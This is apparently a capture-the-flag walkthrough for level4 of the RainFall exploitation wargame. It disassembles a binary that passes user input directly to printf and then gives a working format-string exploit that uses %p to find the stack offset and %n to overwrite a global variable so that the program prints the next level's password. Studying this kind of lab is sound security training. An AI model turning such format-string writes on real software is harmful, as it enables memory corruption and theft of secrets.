#### notes
```
8049810  m    : global variable m
8048444  p    : fn : called in n
8048457  n    : fn : called in main
80484a7  main : rak 3arf
```

##### 0x08048457 : n() : disassembly
_`<0> -> <+3> : prepare stack frame for n function with size 536`_
```c
0x08048457 <+0>:	push   ebp
0x08048458 <+1>:	mov    ebp,esp
0x0804845a <+3>:	sub    esp,0x218 // esp's size  = 536
```
_`<+9> -> <+35> : prepare arguments for fgets function`_
```c
0x08048460 <+9>:	mov    eax,ds:0x8049804 // eax = stdin
0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax // esp+8 = eax = stdin
0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200 // esp+4 = 512
0x08048471 <+26>:	lea    eax,[ebp-0x208] // eax = address of (ebp-520)
0x08048477 <+32>:	mov    DWORD PTR [esp],eax // *esp = eax
0x0804847a <+35>:	call   0x8048350 <fgets@plt> // fgets(ebp-520, 512, stdin) // fgets(&esp, esp+4, esp+8)
```
_`<+40> -> <+49> : prepare arguments to call p function`_
```c
0x0804847f <+40>:	lea    eax,[ebp-0x208] // eax = address of (ebp-520)
0x08048485 <+46>:	mov    DWORD PTR [esp],eax
0x08048488 <+49>:	call   0x8048444 <p>
```
_`<54> -> <+64> : compare value of global var "m" to 16930116`_
```c
0x0804848d <+54>:	mov    eax,ds:0x8049810 // eax = m
0x08048492 <+59>:	cmp    eax,0x1025544 // if eax == 16930116
0x08048497 <+64>:	jne    0x80484a5 <n+78> // if condition not true jump to line 78
```
_`<+66> -> <+73> : if condition passed, call system to print the pass`_
```c
0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590 // "/bin/cat /home/user/level5/.pass"
0x080484a0 <+73>:	call   0x8048360 <system@plt> // system("/bin/cat /home/user/level5/.pass")
```
_`<+78> -> <+79> : if condition rejected exit the program and pop it from the stack`_
```c
0x080484a5 <+78>:	leave
0x080484a6 <+79>:	ret
```
##### 0x08048444 : p() : disassembly
_`<+0> -> <+3> : init stack frame for p with size 24`_
```c
0x08048444 <+0>:	push   ebp
0x08048445 <+1>:	mov    ebp,esp
0x08048447 <+3>:	sub    esp,0x18
```
_`<+6> -> <+12> : send first param (ebp+8) to printf `_
```
to view the argument value , 
- break point to P 
- run with this value "allali is sexy" when fgets is reached 
- debug like that  :
```
```c
(gdb) x $ebp+0x8 // view the address saved in ebp+8 
0xbffff4e0:	0xbffff4f0
(gdb) x 0xbffff4f0 //view the address pointed to by this address 
0xbffff4f0:	0x41414141
(gdb) x/s 0xbffff4f0 // view the value stored in that address 
0xbffff4f0:	 "allali is sexy\n"
(gdb)
```
```c
0x0804844a <+6>:	mov    eax,DWORD PTR [ebp+0x8] // eax = *argv[1]
0x0804844d <+9>:	mov    DWORD PTR [esp],eax // *esp = eax
0x08048450 <+12>:	call   0x8048340 <printf@plt> // printf(esp)
```
_`<+17> -> <+18> : pop the stack frame, to exit the function`_
```c
0x08048455 <+17>:	leave
0x08048456 <+18>:	ret
```
---
#### Solution :
---
lets find where the address is placed first 
```c
level4@RainFall:~$ (python -c 'print  "\x08\x04\x98\x10"[::-1] + "%p " * 20') | ./level4
0xb7ff26b0 0xbffff754 0xb7fd0ff4 (nil) (nil) 0xbffff718 0x804848d  0xbffff510 0x200      0xb7fd1ac0 
0xb7ff37d0 0x8049810  0x25207025 0x70252070  0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
               ↑ 
              here at position : 12
```
we gonna use same solution as previous exercice [level3][0] , to write `16930116` into the m variable as the address itself costin 4 bytes of memory
and `%n` write all the size that has been read befoer it to the address  given in the `x` position `%x$n`
so the exploit will be like bellow : 
x  = 16930112
Final Exploit :
```shell
(python -c 'print  "\x08\x04\x98\x10"[::-1] + "%16930112d" + "%12$n"') | ./level4
                            4 bytes              x bytes        position 12
```


[0]: ../level3/readme.md